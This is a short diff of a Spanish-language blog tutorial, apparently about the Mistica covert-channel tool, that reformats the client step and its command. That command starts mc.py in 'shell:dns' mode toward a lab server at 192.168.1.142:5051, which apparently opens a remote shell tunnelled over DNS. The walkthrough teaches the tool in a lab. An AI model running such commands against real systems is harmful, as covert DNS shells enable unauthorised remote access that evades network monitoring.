@@ -309,8 +309,8 @@ Servidor:
 
 ![image132.png]({{site.baseurl}}/images/Mistica/image132.png)
 
-Cliente:
-python.exe C:\Users\Sergio\Downloads\Mistica-master\mc.py -m shell:dns -w "--hostname 192.168.1.142 --port 5051 --query SOA" -k key
+**Cliente**
+`python.exe mc.py -m shell:dns -w "--hostname 192.168.1.142 --port 5051 --query SOA" -k key`
 
 ![image133.png]({{site.baseurl}}/images/Mistica/image133.png)
 
